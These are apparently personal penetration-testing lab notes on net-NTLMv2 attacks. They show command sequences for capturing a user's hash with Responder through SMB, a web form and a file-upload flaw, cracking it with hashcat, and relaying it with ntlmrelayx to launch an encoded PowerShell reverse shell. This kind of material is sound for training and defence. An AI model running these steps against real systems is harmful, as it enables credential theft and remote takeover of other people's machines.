#### net-NTLMv2

sometimes we may gain access to a system as an unpriveleged user which means we cannot use tools like mimikatz

in this example we will assume we setup a bind shell on our target windows machine and connect to it 

    $ nc 192.168.50.50 4444

we can now check which user we are logged in as and what priveleges we have

    $ whoami

    $ net user ted

ted does not belong to the administrator group but does belong to the Remote Desktop Users group

because we do not have Admin privs we can not use mimikatz, but we can setup an smb server and use ted to attempt authentication
to capture his NTLM hash

    $ sudo responder -I tun0

next we want to provide an arbitrary share in order to catch ted's auth creds

#### capturing creds from web form

    └─$ sudo responder -I tun0 -wd

then in the http form

    \\192.168.45.215\\test\blah to imaginary file to let us catch creds in our responder



if we visit our NC bind shell terminal to our first machine 

    C:\> dir \\192.168.119.2\test

in this example test does not exist

Responder will capture the hash so we can save it to ted.hash

and then find the hashcat mode 

    hashcat --help | grep -i "ntlm"

and using the NTLMv2 network protocol mode

    $ hashcat -m 5600 ted.hash /usr/share/wordlists/rockyou.txt --force

now we should be able to utilize the rdp protocol to connect with ted to the target machine with the cracked hash password

#### capturing ntlm via http upload vuln

in this example, the web server was vulnearble to a file upload vulnerability - while there was no executable php or asp code that could be achieved (as seen in the simple-backdoor.php file i attempted to upload), through this upload vuln we are able to pass the responder path to our non existing smb share to capture the ntlm hash

![_config.yml]({{ site.baseurl }}/images/exploitation/net_ntlm_file_upload.png)

after retrieving the hash via the method in the pic above we perform the last 2 hashcat steps mentioned in the steps above to get the password

#### relaying Net-NTLMv2

in this attack we will not only grab the hash but then forward it on to a target of our choosing with one of the impacket libraries ntlmrelayx 

    $ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc base64encode ps"

### Note: i used this one liner for a [PS reverse shell](https://st4rguard.github.io/evading_AV/)

in the command above we use no-http-server because we want to forward smb and then smb2 for smbv2 then our target machine and finally our command which we have opted for a powershell reverse shell one liner

next we conect to our target with netcat to get our client to attempt to establish an smb connection

    C:> dir \\192.168.1.1\test.txt

then in our ntlmrelayx tab we receive an incoming connection

this will establish our reverse shell connection
